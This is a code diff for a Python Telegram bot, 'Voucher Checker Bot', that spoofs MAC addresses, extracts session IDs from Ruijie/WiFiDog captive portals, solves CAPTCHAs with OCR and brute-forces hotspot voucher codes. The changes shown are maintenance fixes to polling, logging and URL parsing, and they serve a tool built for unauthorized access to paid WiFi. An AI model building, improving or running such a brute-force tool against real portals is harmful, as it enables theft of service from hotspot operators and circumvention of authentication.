@@ -1,8 +1,9 @@
 """
-Voucher Checker Bot — No Approval / Fixed Version
-==================================================
+Voucher Checker Bot — No Approval / Fully Fixed
+================================================
 - Fixed 'length' variable bug
-- Fixed 409 conflict handling (single instance)
+- Fixed 409 conflict (skip_pending=True)
+- Improved WiFiDog URL parsing
 - No Key/Admin required
 - SQLite + OCR
 """
@@ -263,7 +264,8 @@ class ScanState:
 
 class VoucherBot:
     def __init__(self):
-        self.bot = AsyncTeleBot(BOT_TOKEN)
+        # skip_pending=True to avoid 409 conflict
+        self.bot = AsyncTeleBot(BOT_TOKEN, skip_pending=True)
         self.db = Database()
         self.captcha = CaptchaOCR()
         self.user_data: Dict[int, Dict] = {}
@@ -346,6 +348,7 @@ class VoucherBot:
             return previous_session_id
 
     async def resolve_wifidog_url(self, wifidog_url: str) -> Optional[str]:
+        """Improved WiFiDog URL resolver with proper encoding."""
         try:
             mac = self.get_mac()
             url = self.replace_mac(wifidog_url, new_mac=mac)
@@ -355,16 +358,30 @@ class VoucherBot:
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             }
             session = await self.get_session()
+            
+            # Try to get sessionId from redirect
             async with session.get(url, allow_redirects=True, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=20)) as r:
                 final_url = str(r.url)
+                log.info(f"[WiFiDog] Final URL: {final_url[:100]}...")
+                
+                # Check if sessionId is in URL
                 if "sessionId" in final_url:
                     return final_url
+                
+                # Try to find sessionId in response body
                 body = await r.text()
                 m = re.search(r"sessionId['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9]+)", body)
                 if m:
-                    return f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/vkrbnozfeh2oltvlvlw&IS_EG=0&sessionId={m.group(1)}"
+                    session_id = m.group(1)
+                    return f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/vkrbnozfeh2oltvlvlw&IS_EG=0&sessionId={session_id}"
+                
+                log.warning(f"[WiFiDog] No sessionId found. URL: {final_url[:100]}")
                 return None
+                
+        except asyncio.TimeoutError:
+            log.warning("[WiFiDog] Timeout resolving URL")
+            return None
         except Exception as e:
             log.error(f"[WiFiDog] resolve error: {e}")
             return None
@@ -527,7 +544,7 @@ class VoucherBot:
                 total += v
         return total
 
-    # ─── FIXED: iter_codes now accepts 'length' parameter ──────────────────
+    # ─── FIXED: iter_codes with length parameter ───────────────────────────
     def iter_codes(self, mode, length=None, start_digit=None):
         if isinstance(mode, int):
             cs = CHARSETS.get(mode)
@@ -766,7 +783,6 @@ class VoucherBot:
 
         return None
 
-    # ─── FIXED: Passing 'length' to iter_codes ─────────────────────────────
     async def run_bruteforce(self, chat_id: int, state: ScanState, progress_msg):
         session_url = self.user_data.get(chat_id, {}).get("session_url")
         if not session_url:
@@ -1527,6 +1543,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         backoff = 5
         while True:
             try:
+                # skip_pending=True already set, so no 409 conflict
                 await self.bot.infinity_polling(timeout=20, request_timeout=20)
                 return
             except (aiohttp.ClientError, asyncio.TimeoutError) as e:
